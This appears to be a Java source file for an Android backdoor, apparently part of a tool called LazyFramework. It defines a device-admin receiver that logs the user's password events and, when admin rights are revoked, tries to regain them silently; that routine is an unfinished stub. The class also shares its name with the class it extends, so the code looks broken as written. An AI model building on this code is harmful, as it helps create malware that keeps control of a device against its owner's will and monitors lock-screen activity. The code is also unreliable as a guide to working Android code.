package com.lazyframework.backdoor;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class DeviceAdminReceiver extends DeviceAdminReceiver {
    private static final String TAG = "LazyFramework";
    
    public static ComponentName getComponentName(Context context) {
        return new ComponentName(context, DeviceAdminReceiver.class);
    }
    
    @Override
    public void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
        Log.d(TAG, "🔐 Device Admin enabled");
    }
    
    @Override
    public void onDisabled(Context context, Intent intent) {
        super.onDisabled(context, intent);
        Log.d(TAG, "🔓 Device Admin disabled");
        // Re-enable immediately if still running
        reEnableAdmin(context);
    }
    
    @Override
    public void onPasswordChanged(Context context, Intent intent) {
        super.onPasswordChanged(context, intent);
        Log.d(TAG, "🔑 Password changed");
    }
    
    @Override
    public void onPasswordFailed(Context context, Intent intent) {
        super.onPasswordFailed(context, intent);
        Log.d(TAG, "❌ Password failed");
    }
    
    @Override
    public void onPasswordSucceeded(Context context, Intent intent) {
        super.onPasswordSucceeded(context, intent);
        Log.d(TAG, "✅ Password succeeded");
    }
    
    private void reEnableAdmin(Context context) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) 
                context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName cn = getComponentName(context);
            
            if (!dpm.isAdminActive(cn)) {
                // Try to re-enable silently
                Log.d(TAG, "🔄 Attempting to re-enable Device Admin");
                // This requires user interaction normally, 
                // but we'll try to do it programmatically
            }
        } catch (Exception e) {
            Log.e(TAG, "Re-enable error: " + e.getMessage());
        }
    }
}
